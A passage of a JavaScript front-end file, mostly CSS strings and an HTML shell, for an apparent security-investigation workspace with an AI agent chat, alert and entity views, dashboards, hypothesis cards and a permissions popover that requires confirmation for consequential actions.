var(--panel)}\n.cs-avstack{display:inline-flex}\n.cs-avstack .cs-av+.cs-av{margin-left:-7px}\n.cs-tag{display:inline-block;font-size:10.5px;font-weight:600;padding:2px 8px;border-radius:var(--r-pill);background:var(--bg-2);color:var(--ink-2);margin:1px 3px 1px 0}\n.cs-num{font-variant-numeric:tabular-nums;color:var(--ink-1)}\n.cs-pill{display:inline-flex;align-items:center;padding:3px 11px;border-radius:var(--r-xs);font-size:11px;font-weight:600;color:#fff}\n.cs-sev{display:inline-flex;align-items:center;gap:6px}\n.cs-sevdot{width:8px;height:8px;border-radius:50%}\n.cs-actions{color:var(--ink-4);text-align:center}\n.own{display:inline-flex;align-items:center;gap:7px;color:var(--ink-1);white-space:nowrap}\n\n/* simple apps: alerts + entities */\n.simple-app{display:flex;flex-direction:column;height:100%;min-height:0}\n.sa-head{flex:0 0 auto;padding:12px 14px;border-bottom:1px solid var(--line)}\n.sa-title{font-size:13px;font-weight:700;color:var(--ink-0)}\n.sa-sub{font-size:11.5px;color:var(--ink-3);margin-top:2px}\n.sa-scroll{flex:1;overflow:auto;padding:14px}\n.al-stats{display:flex;gap:9px;margin-bottom:14px}\n.gtable{width:100%;border-collapse:collapse;font-size:12px}\n.gtable th{text-align:left;font-weight:600;color:var(--ink-3);font-size:10.5px;text-transform:uppercase;letter-spacing:.04em;padding:7px 9px;border-bottom:1px solid var(--line)}\n.gtable td{padding:9px 9px;border-bottom:1px solid var(--line);color:var(--ink-1)}\n.gtable tr:last-child td{border-bottom:none}\n.al-rule{font-weight:600;color:var(--ink-0);display:flex;align-items:center;gap:8px}\n.al-rule .ari{color:var(--ink-3);flex:0 0 auto}\n.ent-row{display:flex;align-items:center;gap:12px;padding:11px;border:1px solid var(--line);border-radius:var(--r-md);margin-bottom:9px;background:var(--panel)}\n.ent-risk{width:42px;height:42px;border-radius:11px;display:grid;place-items:center;font-weight:700;font-size:14px;color:#fff;flex:0 0 auto}\n.ent-b{flex:1;min-width:0}\n.ent-n{font-size:13px;font-weight:600;color:var(--ink-0);font-family:var(--mono)}\n.ent-meta{font-size:11.5px;color:var(--ink-3);margin-top:2px}\n.ent-type{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.03em;color:var(--ink-3);background:var(--bg-2);padding:3px 8px;border-radius:var(--r-pill);flex:0 0 auto}\n\n/* dashboards */\n.dash-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:14px;overflow:auto}\n.tile{border:1px solid var(--line);border-radius:var(--r-md);padding:13px;background:var(--panel);box-shadow:var(--sh-xs)}\n.tile.wide{grid-column:1 / -1}\n.tile-h{font-size:10.5px;font-weight:600;text-transform:uppercase;letter-spacing:.04em;color:var(--ink-3);margin-bottom:10px}\n.tile-big{font-size:30px;font-weight:700;color:var(--ink-0);letter-spacing:-.02em}\n.tile-big small{font-size:12px;font-weight:500;color:var(--ink-3);margin-left:6px}\n.tile-sub{font-size:11px;color:var(--ink-3);margin-top:8px}\n.tile-sub.up{color:var(--green)}\n.bars-row{display:flex;align-items:flex-end;gap:10px;height:84px}\n.bcol{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:flex-end;gap:6px;height:100%}\n.bcol .bk{width:100%;border-radius:4px 4px 0 0;min-height:6px}\n.bcol .bl{font-size:10px;color:var(--ink-3);white-space:nowrap}\n.donut{width:96px;height:96px;border-radius:50%;margin:4px auto;display:grid;place-items:center}\n.donut .hole{width:62px;height:62px;border-radius:50%;background:var(--panel);display:grid;place-items:center;font-weight:700;font-size:15px;color:var(--ink-0)}\n.spark{width:100%;height:58px;display:block}\n.legend{display:flex;gap:12px;flex-wrap:wrap;margin-top:10px;font-size:11px;color:var(--ink-2);justify-content:center}\n.legend i{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:5px;vertical-align:middle}\n\n/* \"view in discover\" link on the in-chat events card */\n.discover-link{margin-left:auto;display:inline-flex;align-items:center;gap:6px;height:26px;padding:0 10px;border-radius:var(--r-sm);background:var(--panel);border:1px solid var(--line-2);color:var(--blue-d);font-weight:600;font-size:11.5px;transition:.13s}\n.discover-link:hover{border-color:var(--blue);background:var(--blue-bg)}\n\n/* ===== BRIEF (dynamic Overview) ===== */\n.brief-head{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:11px 14px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md) var(--r-md) 0 0}\n.bf-status{display:flex;align-items:center;gap:8px;min-width:0}\n.bf-dot{width:8px;height:8px;border-radius:50%;flex:0 0 auto}\n.bf-dot.live{background:var(--green)}\n.bf-dot.stale{background:var(--amber)}\n.bf-dot.gen{background:var(--blue);animation:bfpulse 1s ease-in-out infinite}\n@keyframes bfpulse{0%,100%{opacity:1}50%{opacity:.3}}\n.bf-state{font-size:12px;font-weight:600;color:var(--ink-1);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}\n.bf-tools{display:flex;align-items:center;gap:6px;flex:0 0 auto}\n.bf-ver,.bf-update{display:inline-flex;align-items:center;gap:6px;height:28px;padding:0 10px;border-radius:var(--r-sm);\n  font-size:11.5px;font-weight:600;border:1px solid var(--line-2);color:var(--ink-2);background:var(--panel);transition:.13s}\n.bf-ver:hover,.bf-update:hover{border-color:var(--line-strong);color:var(--ink-0)}\n.bf-update.hot{background:var(--amber);border-color:var(--amber);color:#5a3d00}\n.bf-update.hot:hover{filter:brightness(.97)}\n.brief-assembling{display:flex;align-items:center;gap:10px;padding:18px 14px;color:var(--ink-3);font-size:12.5px;\n  background:var(--bg-2);border:1px dashed var(--line-strong);border-radius:var(--r-md)}\n.brief-snap-banner{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding:8px 11px;border-radius:var(--r-sm);\n  background:var(--violet-bg);border:1px solid var(--violet-bg);color:var(--violet);font-size:11.5px;font-weight:500}\n.brief-snap-banner button{margin-left:auto;font-weight:700;color:var(--violet);text-decoration:underline}\n.brief-doc{transition:opacity .2s}\n.brief-assess-sec .bsec-h h4{margin:0}\n.bf-fresh{font-size:11.5px;font-weight:600;color:var(--ink-4);white-space:nowrap}\n.brief-doc.regen{opacity:.45;pointer-events:none}\n.brief-doc.flash{animation:briefFlash 1.2s ease}\n@keyframes briefFlash{0%{background:var(--blue-bg)}100%{background:transparent}}\n.brief-assess{font-size:13px;line-height:1.62;color:var(--ink-1);margin-bottom:13px}\n.brief-assess .ba-mark{display:none}\n.brief-assess .ba-mark{width:4px;flex:0 0 auto;border-radius:3px;align-self:stretch;background:var(--ink-4)}\n.brief-assess.warn .ba-mark{background:var(--amber)}\n.brief-assess.crit .ba-mark{background:var(--red)}\n.brief-assess.ok .ba-mark{background:var(--green)}\n.brief-assess.info .ba-mark{background:var(--blue)}\n.brief-callout{display:flex;align-items:flex-start;gap:9px;padding:11px 12px;border-radius:var(--r-md);font-size:12.5px;\n  line-height:1.5;margin-bottom:0;border:1px solid transparent}\n.brief-callout svg{flex:0 0 auto;margin-top:1px}\n.brief-callout.warn{background:var(--amber-bg);color:#7a5200;border-color:#f0e2c0}\n.brief-callout.crit{background:var(--red-bg);color:var(--red-d);border-color:#f3d0d4}\n.brief-callout.ok{background:var(--green-bg);color:#1a6b48;border-color:#bfe6d2}\n.brief-callout.info{background:var(--blue-bg);color:var(--blue-d);border-color:#cfe0f5}\n.bsec{margin-bottom:18px}\n.bsec h4{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-3);margin-bottom:9px}\n.bsec-h{display:flex;align-items:center;justify-content:space-between;margin-bottom:9px}\n.bsec-h h4{margin:0}\n.bsec-x{font-size:11px;font-weight:600;color:var(--blue-d);cursor:pointer;text-transform:none;letter-spacing:0}\n.bsec-x:hover{text-decoration:underline}\n.bnarr{font-size:13px;line-height:1.62;color:var(--ink-1)}\n.bnarr code,.bq li code{font-family:var(--mono);font-size:11.5px;background:var(--bg-2);padding:1px 5px;border-radius:4px;color:var(--ink-0)}\n.bchain{display:flex;flex-direction:column;padding-left:4px}\n.bchain-step{display:flex;gap:11px;padding:7px 0;position:relative}\n.bcs-time{flex:0 0 auto;width:46px;font-size:10.5px;color:var(--ink-4);padding-top:1px}\n.bcs-txt{font-size:12px;line-height:1.5;color:var(--ink-1);position:relative;padding-left:16px}\n.bcs-txt::before{content:\"\";position:absolute;left:0;top:5px;width:7px;height:7px;border-radius:50%;background:var(--ink-4);box-shadow:0 0 0 3px var(--panel);z-index:1}\n.bcs-txt::after{content:\"\";position:absolute;left:3px;top:12px;width:1.5px;height:calc(100% + 2px);background:var(--line-2)}\n.bchain-step:last-child .bcs-txt::after{display:none}\n.bchain-step.act .bcs-txt::before,.bchain-step.now .bcs-txt::before{background:var(--blue)}\n.bchain-step.crit .bcs-txt::before{background:var(--red)}\n.bcs-txt b{color:var(--ink-0)}\n.bcs-txt .flag{color:var(--red-d);font-weight:600}\n.bfinds{list-style:none;display:flex;flex-direction:column;gap:7px}\n.bfind{display:flex;gap:10px;padding:9px 10px;border:1px solid var(--line);border-radius:var(--r-sm);cursor:pointer;transition:.12s}\n.bfind:hover{border-color:var(--line-strong);background:var(--bg-2)}\n.bfind-n{flex:0 0 auto;width:18px;height:18px;border-radius:5px;background:var(--blue);color:#fff;font-size:10px;font-weight:700;display:grid;place-items:center}\n.bfind-t{font-size:12px;font-weight:600;color:var(--ink-0)}\n.bfind-w{font-size:11.5px;line-height:1.45;color:var(--ink-3);margin-top:2px}\n.hypo-board{display:flex;flex-direction:column;gap:10px}\n.hypo-empty{font-size:12px;line-height:1.55;color:var(--ink-3);padding:12px;background:var(--bg-2);border:1px dashed var(--line-strong);border-radius:var(--r-md)}\n.link-btn{font-weight:700;color:var(--blue-d)}\n.link-btn:hover{text-decoration:underline}\n.brief-add{display:inline-flex;align-items:center;gap:6px;height:28px;padding:0 10px;border-radius:var(--r-sm);font-size:11.5px;font-weight:600;\n  background:var(--panel);color:var(--ink-2);border:1px solid var(--line-2);transition:.12s;text-transform:none;letter-spacing:0}\n.brief-add:hover{border-color:var(--line-strong);color:var(--ink-0)}\n.hypo{position:relative;border:1px solid var(--line);border-radius:var(--r-md);padding:13px 14px;background:var(--panel)}\n.hypo.investigating{background:color-mix(in srgb,var(--amber) 4%,var(--panel));--hc:var(--amber)}\n.hypo.supported{background:color-mix(in srgb,var(--blue) 4%,var(--panel));--hc:var(--blue)}\n.hypo.confirmed{background:color-mix(in srgb,var(--green) 4%,var(--panel));--hc:var(--green)}\n.hypo.refuted{opacity:.9;--hc:var(--ink-4)}\n.hypo-top{display:flex;align-items:center;gap:9px;margin-bottom:10px}\n.hypo-state{display:inline-flex;align-items:center;gap:5px;font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;padding:3px 9px 3px 7px;border-radius:var(--r-pill)}\n.hypo-state svg{flex:0 0 auto}\n.hypo-state.inv{background:var(--amber-bg);color:#7a5200}\n.hypo-state.sup{background:var(--blue-bg);color:var(--blue-d)}\n.hypo-state.conf{background:var(--green-bg);color:#1a6b48}\n.hypo-state.ref{background:var(--bg-2);color:var(--ink-3)}\n.hypo-conf{display:inline-flex;align-items:center;gap:6px}\n.hcm{display:inline-flex;gap:2px;align-items:flex-end}\n.hcm i{width:5px;height:7px;border-radius:1.5px;background:var(--line-strong)}\n.hcm i:nth-child(2){height:9px}\n.hcm i:nth-child(3){height:11px}\n.hcm.l1 i:nth-child(1),.hcm.l2 i:nth-child(-n+2),.hcm.l3 i:nth-child(-n+3){background:var(--hc)}\n.hcm-l{font-size:10px;font-weight:600;color:var(--ink-2);text-transform:capitalize}\n.hypo-auth{margin-left:auto;display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:600;color:var(--ink-2)}\n.hypo-auth .avatar{width:18px;height:18px;font-size:8.5px}\n.hypo-auth.agent{color:var(--accent-d);gap:4px}\n.hypo-auth.agent svg{color:var(--accent-d)}\n.hypo-stmt{font-size:13px;line-height:1.5;color:var(--ink-0);font-weight:550}\n.hypo-ev{display:flex;flex-direction:column;gap:13px;margin-top:12px;padding-top:12px;border-top:1px solid var(--line)}\n.hev-h{display:flex;align-items:center;gap:7px;margin-bottom:6px}\n.hev-h-l{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.06em}\n.hev-h-n{display:inline-grid;place-items:center;min-width:15px;height:15px;padding:0 4px;border-radius:5px;font-size:9px;font-weight:700;color:#fff}\n.hev.for .hev-h-l{color:#1a6b48}\n.hev.for .hev-h-n{background:var(--green)}\n.hev.against .hev-h-l{color:var(--red-d)}\n.hev.against .hev-h-n{background:var(--red)}\n.hev ul{list-style:none;display:flex;flex-direction:column;gap:1px}\n.hypo-acts{display:flex;flex-wrap:wrap;gap:7px;margin-top:12px;padding-top:12px;border-top:1px solid var(--line)}\n.hact{display:inline-flex;align-items:center;gap:6px;height:30px;padding:0 12px;border-radius:var(--r-sm);font-size:11.5px;font-weight:600;\n  background:var(--bg-2);color:var(--ink-1);border:1px solid var(--line-2);transition:.12s}\n.hact:hover{border-color:var(--line-strong)}\n.hact.gated{background:var(--panel);border-color:#f3d0d4;color:var(--red-d)}\n.hact.gated:hover{background:var(--red-bg)}\n.brec{display:flex;flex-direction:column;gap:7px}\n.brec-btn{display:flex;align-items:center;gap:9px;width:100%;padding:10px 11px;border-radius:var(--r-sm);font-size:12.5px;font-weight:600;\n  background:var(--panel);border:1px solid var(--line);color:var(--ink-1);transition:.12s;text-align:left}\n.brec-btn:hover{border-color:var(--line-strong);background:var(--bg-2)}\n.brec-btn.gated{border-color:#f3d0d4;color:var(--red-d)}\n.brec-btn.gated:hover{background:var(--red-bg)}\n.brec-btn .brec-x{margin-left:auto;color:var(--ink-4)}\n.bq{list-style:none;display:flex;flex-direction:column;gap:6px}\n.bq li{font-size:12px;line-height:1.5;color:var(--ink-2);padding-left:16px;position:relative}\n.bq li::before{content:\"?\";position:absolute;left:2px;top:0;color:var(--ink-4);font-weight:700}\n.brief-divider{display:flex;align-items:center;gap:12px;margin:4px 0 16px;color:var(--ink-4)}\n.brief-divider::before,.brief-divider::after{content:\"\";height:1px;background:var(--line);flex:1}\n.brief-divider span{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.09em;white-space:nowrap}\n.hev-item{display:grid;grid-template-columns:auto 1fr auto auto;align-items:center;gap:9px;padding:7px 8px;margin:0 -8px;border-radius:var(--r-sm);cursor:pointer;transition:.12s}\n.hev-item:hover{background:var(--bg-2)}\n.hev-item.plain{cursor:default;display:block}\n.hev-item.plain:hover{background:transparent}\n.hev-ic{display:grid;place-items:center;color:var(--ink-3)}\n.hev-t{font-size:11.5px;color:var(--ink-1);line-height:1.35;font-weight:500}\n.hev-src{font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--ink-4);white-space:nowrap}\n.hev-go{color:var(--ink-4);opacity:0;transform:translateX(-3px);transition:.13s}\n.hev-item:hover .hev-go{opacity:1;transform:translateX(0)}\n.evcard{scroll-margin-top:12px}\n.evcard.flash{animation:evFlash 1.5s ease}\n@keyframes evFlash{0%,55%{box-shadow:0 0 0 2px var(--blue)}100%{box-shadow:0 0 0 0 transparent}}\n.bf-vers-menu{position:fixed;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);box-shadow:var(--sh-lg);padding:6px;z-index:330;min-width:260px;max-width:300px;animation:pop .14s ease}\n.bfv-row{display:flex;flex-direction:column;align-items:flex-start;gap:2px;width:100%;padding:8px 10px;border-radius:var(--r-sm);transition:.12s;text-align:left}\n.bfv-row:hover{background:var(--bg-2)}\n.bfv-row.on{background:var(--blue-bg)}\n.bfv-v{font-size:11.5px;font-weight:700;color:var(--ink-0)}\n.bfv-l{font-size:11px;color:var(--ink-2)}\n.bfv-t{font-size:10px;color:var(--ink-4)}\n\n@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}\n@keyframes pop{from{opacity:0;transform:scale(.96) translateY(-4px)}to{opacity:1;transform:scale(1) translateY(0)}}\n@keyframes toastin{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}\n@keyframes bounce{0%,60%,100%{transform:translateY(0);opacity:.5}30%{transform:translateY(-5px);opacity:1}}\n@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(20,154,111,.5)}70%{box-shadow:0 0 0 6px rgba(20,154,111,0)}100%{box-shadow:0 0 0 0 rgba(20,154,111,0)}}\n@keyframes spin{to{transform:rotate(360deg)}}\n.spinning{animation:spin .8s linear infinite}\n\n@media (max-width:1180px){.inspector{width:330px}.nav{width:240px}}\n";
const TL_SHELL = "<div class=\"shell\">\n  <nav class=\"rail\" id=\"rail\"></nav>\n  <div class=\"perm-pop\" id=\"permPop\">\n    <div class=\"pp-id\">\n      <span class=\"avatar\" style=\"background-image:url('avatars/you.jpg');background-size:cover;background-position:center;color:transparent\">YU</span>\n      <div class=\"pp-idmeta\"><b>You</b><span id=\"roleLabel\">Senior Analyst</span></div>\n      <span class=\"sh\" id=\"shieldIc\"></span>\n    </div>\n    <hr>\n    <h4>Agent permissions — like Claude</h4>\n    <div class=\"perm-row ok\"><span class=\"pi\" id=\"pr1\"></span> <span>Read &amp; gather — <b>auto-runs</b>, shown live</span></div>\n    <div class=\"perm-row rev\"><span class=\"pi\" id=\"pr2\"></span> <span>Assemble &amp; draft — <b>proposed as a diff</b></span></div>\n    <hr>\n    <h4>World-changing actions you may approve</h4>\n    <div class=\"perm-row ok\" id=\"permA\"></div>\n    <div class=\"perm-row ok\" id=\"permB\"></div>\n    <div class=\"perm-row ok\" id=\"permC\"></div>\n    <div class=\"perm-row no\"><span class=\"pi\" id=\"pr6\"></span> <span>Delete data / purge indices</span></div>\n    <hr>\n    <div class=\"note\">Reads are free. Drafts are reviewable. Consequential actions need explicit confirmation with blast radius — and you can grant <b>“always allow”</b> per case to shed friction.</div>\n  </div>\n  <div class=\"rail-pop\" id=\"settingsPop\"></div>\n  <div class=\"stage\" id=\"stage\">\n  <div class=\"navpanel\" id=\"navPanel\">\n    <div class=\"nav\">\n      <div id=\"navTop\"></div>\n      <div class=\"nav-scroll\" id=\"navScroll\"></div>\n    </div>\n  </div>\n  <div class=\"app\" id=\"homeView\">\n  <!-- topbar removed — its controls now live in the rail (solution switch, restart, You) and the chat header (panel toggle) -->\n  <!-- BODY -->\n  <div class=\"body\">\n    <!-- THREAD -->\n    <div class=\"thread\">\n      <div class=\"spine\" id=\"spine\"></div>\n      <div class=\"stream\" id=\"stream\"><div class=\"stream-in\" id=\"streamIn\"></div></div>\n      <div class=\"composer\">\n        <div class=\"composer-in\">\n          <div class=\"suggest\" id=\"suggest\"></div>\n          <div class=\"composer-box\">\n            <textarea id=\"composerInput\" rows=\"1\" placeholder=\"Ask the agent, or pick a suggestion…\"></textarea>\n            <button class=\"send\" id=\"sendBtn\" onclick=\"App.sendComposer()\"><span id=\"sendIc\"></span></button>\n          </div>\n          <div class=\"composer-foot\">\n            <span class=\"auto-pill\"><span id=\"footIc\"></span> Reads run automatically</span> · drafts &amp; actions ask first\n          </div>\n        </div>\n      </div>\n    </div>\n\n    <!-- INSPECTOR -->\n    <div class=\"inspector\" id=\"inspector\"></div>\n  </div>\n  </div>\n  <div class=\"apppage\" id=\"appPage\" hidden></div>\n  </div>\n</div>\n<div class=\"toasts\" id=\"toasts\"></div>\n<div class=\"flyout-backdrop\" id=\"flyoutBackdrop\" onclick=\"App.closeFlyout()\"></div>\n<aside class=\"flyout\" id=\"flyout\"><div class=\"flyout-inner\" id=\"flyoutContent\"></div></aside>";
let _mounted = false;
const BRIEF_EXTRA_CSS = `
/* ===== Brief: action cards ===== */
.radar-sec-sub{font-size:10.5px;font-weight:500;letter-spacing:0;text-transform:none;color:var(--ink-4);margin-left:8px}
.rad-card{flex-direction:column;align-items:stretch;cursor:pointer;background:linear-gradient(180deg,color-mix(in srgb,var(--sev) 5%,var(--panel)),var(--panel));border-color:color-mix(in srgb,var(--sev) 16%,var(--line));transition:box-shadow .15s,border-color .15s}
.rad-card:hover{box-shadow:var(--sh-sm);border-color:var(--sev)}
.rad-feat-card{border-color:color-mix(in srgb,var(--sev) 30%,var(--line));box-shadow:0 1px 3px rgba(20,23,28,.06)}
.rad-card .rad-tag.motion{display:inline-flex;align-items:center;gap:7px;background:var(--amber-bg);color:var(--amber);border:none}
.rad-spin{width:9px;height:9px;border-radius:50%;border:2px solid color-mix(in srgb,var(--amber) 35%,transparent);border-top-color:var(--amber);display:inline-block;animation:radspin .8s linear infinite}
@keyframes radspin{to{transform:rotate(360deg)}}
.rad-mtr{margin-left:auto;font-size:11px;font-weight:500;color:var(--ink-4)}
.rad-prog{display:flex;align-items:center;gap:9px;margin:2px 0 9px}
.rad-prog-bar{flex:1;height:5px;border-radius:999px;background:var(--bg-2);overflow:hidden}
.rad-prog-bar i{display:block;height:100%;border-radius:999px;background:var(--amber);transition:width .4s var(--anim,ease)}
.rad-prog-pct{font-size:11px;font-weight:600;font-family:var(--mono);color:var(--ink-3)}
/* action row */
.rad-acts{margin-top:6px;padding-top:11px;border-top:1px dashed var(--line-2)}
.rad-act-btns{display:flex;flex-wrap:wrap;align-items:center;gap:8px}
.rad-act{display:inline-flex;align-items:center;gap:6px;padding:7px 12px;border-radius:var(--r-sm);font-size:12.5px;font-weight:550;color:var(--ink-1);background:var(--panel);border:1px solid var(--line-2);cursor:pointer;transition:all .13s;font-family:inherit}
.rad-act:hover{border-color:var(--ink-4);background:var(--bg-2)}
.rad-act svg{color:var(--ink-3)}
.rad-act.gated{color:var(--red-d);border-color:color-mix(in srgb,var(--red) 26%,var(--line))}
.rad-act.gated svg{color:var(--red-d)}
.rad-act.gated:hover{background:var(--red-bg);border-color:var(--red)}
.rad-act.armed{background:var(--red-bg);border-color:var(--red);color:var(--red-d)}
.rad-act.dim{opacity:.4;pointer-events:none}
.rad-chat{display:inline-flex;align-items:center;gap:6px;margin-left:auto;padding:7px 12px;border-radius:var(--r-sm);font-size:12.5px;font-weight:600;color:var(--accent-d);background:none;border:1px solid transparent;cursor:pointer;transition:all .13s;font-family:inherit}
.rad-chat svg{color:var(--accent)}
.rad-chat:hover{background:var(--accent-bg)}
.rad-chat.icon-only{padding:7px;gap:0}
.rad-confirm{margin-top:11px;background:var(--red-bg);border:1px solid color-mix(in srgb,var(--red) 22%,transparent);border-radius:var(--r-sm);padding:11px 12px;animation:radin .16s ease}
.rad-confirm-q{display:flex;gap:9px;font-size:12.5px;line-height:1.5;color:var(--ink-1)}
.rad-confirm-q b{color:var(--red-d);font-weight:600}
.rad-confirm-ic{flex:0 0 auto;color:var(--red-d);margin-top:1px}
.rad-confirm-btns{display:flex;gap:8px;margin-top:11px}
.rad-cf-yes{display:inline-flex;align-items:center;gap:5px;padding:7px 14px;border-radius:var(--r-sm);font-size:12.5px;font-weight:600;color:#fff;background:var(--red);border:none;cursor:pointer;font-family:inherit;transition:background .13s}
.rad-cf-yes svg{color:#fff}
.rad-cf-yes:hover{background:var(--red-d)}
.rad-cf-no{padding:7px 13px;border-radius:var(--r-sm);font-size:12.5px;font-weight:550;color:var(--ink-2);background:none;border:1px solid var(--line-2);cursor:pointer;font-family:inherit}
.rad-cf-no:hover{background:var(--bg-2)}
.rad-done-line{display:flex;align-items:flex-start;gap:8px;margin-top:9px;font-size:12.5px;line-height:1.5;font-weight:500;color:var(--green);animation:radin .2s ease}
.rad-done-line svg{flex:0 0 auto;color:var(--green);margin-top:2px}
@keyframes radin{from{opacity:0;transform:translateY(-3px)}to{opacity:1;transform:none}}
/* ===== In-motion: compact rows (no header, no actions) ===== */
.rad-mrow{display:flex;align-items:center;gap:11px;padding:10px 13px;border:1px solid var(--line-2);border-radius:var(--r-md);background:var(--panel);cursor:pointer;transition:border-color .13s,background .12s;margin-bottom:7px}
.rad-mrow:hover{border-color:var(--sev);background:var(--bg-2)}
.rad-mrow-spin{flex:0 0 auto;width:11px;height:11px;border-radius:50%;border:2px solid color-mix(in srgb,var(--amber) 32%,transparent);border-top-color:var(--amber);animation:radspin .8s linear infinite}
.rad-mrow-body{flex:1;min-width:0;display:flex;flex-direction:column;gap:4px}
.rad-mrow-top{display:flex;align-items:baseline;gap:8px;flex-wrap:wrap}
.rad-mrow-t{font-size:12.5px;font-weight:600;color:var(--ink-1)}
.rad-mrow-who{font-size:11px;font-weight:500;color:var(--ink-4)}
.rad-mrow-prog{display:flex;align-items:center;gap:8px;max-width:280px}
.rad-mrow-bar{flex:1;height:4px;border-radius:999px;background:var(--bg-2);overflow:hidden}
.rad-mrow-bar i{display:block;height:100%;border-radius:999px;background:var(--amber)}
.rad-mrow-pct{font-size:10.5px;font-weight:600;font-family:var(--mono);color:var(--ink-3)}
.rad-mrow-when{flex:0 0 auto;font-size:11px;color:var(--ink-4)}
.radar-watch-sec .rad-watch{display:flex;align-items:flex-start;gap:11px;padding:11px 12px;border-radius:var(--r-sm);cursor:pointer;transition:background .12s;border:1px solid transparent}
.rad-watch:hover{background:var(--bg-2)}
.rad-watch-ic{width:26px;height:26px;border-radius:7px;flex:0 0 auto;display:grid;place-items:center;background:var(--bg-2);color:var(--ink-4)}
.rad-watch-body{flex:1;min-width:0}
.rad-watch-top{display:flex;align-items:baseline;gap:8px;flex-wrap:wrap;margin-bottom:2px}
.rad-watch-t{font-size:13px;font-weight:600;color:var(--ink-1)}
.rad-watch-tag{font-size:9.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--ink-4);background:var(--bg-2);padding:2px 8px;border-radius:999px}
.rad-watch-note{font-size:12px;line-height:1.5;color:var(--ink-3);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.rad-watch-note b{color:var(--ink-2);font-weight:600}
.rad-watch-note code{font-family:var(--mono);font-size:11px;background:var(--bg-2);padding:1px 5px;border-radius:4px}
/* ===== Collapsible chat dock ===== */
.home-special.brief-mode{position:relative}
.brief-mode .radar-page{padding-bottom:82px}
.chat-dock{position:absolute;left:0;right:0;bottom:22px;z-index:40;pointer-events:none}
.chat-badge{display:inline-flex;align-items:center;gap:10px;padding:10px 18px 10px 12px;border-radius:var(--r-pill);background:#2f86ff;border:1px solid rgba(255,255,255,.35);box-shadow:0 8px 24px rgba(43,124,234,.40),0 0 0 1px rgba(43,124,234,.10);pointer-events:auto;cursor:pointer;font-family:inherit;transition:transform .15s var(--anim,ease),box-shadow .15s,opacity .12s,background .15s}
.chat-badge:hover{transform:translateX(-50%) translateY(-1px);box-shadow:0 12px 32px rgba(43,124,234,.50),0 0 0 1px rgba(43,124,234,.14)}
.chat-badge-ic{width:28px;height:28px;border-radius:50%;flex:0 0 auto;display:grid;place-items:center;background:rgba(255,255,255,.26);color:#fff}
.chat-badge-lbl{font-size:13px;font-weight:600;color:#fff;letter-spacing:-.01em}
.chat-panel{position:absolute;left:0;right:0;bottom:0;width:auto;background:var(--panel);border:1px solid var(--line-2);border-radius:var(--r-lg);box-shadow:var(--sh-lg);padding:14px 15px 13px;opacity:0;transform:translateY(10px) scale(.98);transform-origin:bottom center;pointer-events:none;transition:opacity .16s ease,transform .18s var(--anim,ease);}
.chat-dock.open .chat-panel,.chat-dock:focus-within .chat-panel,.chat-dock.pinned .chat-panel{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}
.chat-badge{position:absolute;left:50%;bottom:0;transform:translateX(-50%)}
.chat-dock.open .chat-badge,.chat-dock:focus-within .chat-badge,.chat-dock.pinned .chat-badge{opacity:0;pointer-events:none}
.chat-dock.warming .chat-badge{box-shadow:0 12px 32px rgba(43,124,234,.52),0 0 0 1px rgba(43,124,234,.16)}
.chat-dock.warming .chat-badge-ic{animation:dockSunGlow 1s ease-in-out infinite}
.chat-dock.warming .chat-badge-ic svg{animation:dockSunSpin 1s linear infinite;transform-origin:50% 50%}
@keyframes dockSunSpin{to{transform:rotate(360deg)}}
@keyframes dockSunGlow{0%,100%{box-shadow:0 0 0 0 rgba(255,255,255,.38)}50%{box-shadow:0 0 0 7px rgba(255,255,255,.10)}}
.chat-panel-head{display:flex;align-items:center;justify-content:center;margin-bottom:11px}
.chat-panel-title{display:inline-flex;align-items:center;gap:8px;font-size:13px;font-weight:600;color:var(--ink-0)}
.chat-panel-ic{width:24px;height:24px;border-radius:50%;display:grid;place-items:center;background:var(--accent-bg);color:var(--accent-d)}
.chat-panel-min{width:28px;height:28px;border-radius:var(--r-sm);display:grid;place-items:center;background:none;border:none;color:var(--ink-4);cursor:pointer;transition:background .12s,color .12s}
.chat-panel-min:hover{background:var(--bg-2);color:var(--ink-1)}
.chat-panel .suggest{margin-bottom:10px}
.chat-panel .composer-box{width:100%}
.ptool.open-chat{display:grid;place-items:center;width:30px;height:30px;padding:0;gap:0;border-radius:var(--r-sm);color:var(--accent-d);background:none}
.ptool.open-chat svg{color:var(--accent)}
.ptool.open-chat:hover{background:var(--accent-bg)}
.ptool.open-chat.on{background:var(--bg-2);color:var(--ink-2)}
.ptool.open-chat.on svg{color:var(--ink-3)}
.ptool.open-chat.on:hover{background:var(--line-2)}
/* clickable overview stats -> scroll to section */
.ov-secs{display:flex;flex-wrap:wrap;gap:7px}
.ov-sec{flex:1 1 auto;min-width:94px;appearance:none;font-family:inherit;text-align:left;display:flex;flex-direction:column;align-items:flex-start;gap:5px;padding:11px 13px 11px;background:linear-gradient(180deg,color-mix(in srgb,var(--dec) 8%,var(--panel)),var(--panel));border:1px solid color-mix(in srgb,var(--dec) 26%,var(--line));border-radius:var(--r-md);cursor:pointer;transition:border-color .12s,box-shadow .12s}
.ov-sec:hover{border-color:var(--dec);box-shadow:0 1px 4px rgba(20,23,28,.07)}
.ov-spark{display:flex;align-items:flex-end;gap:2px;height:20px;width:100%;margin-bottom:1px}
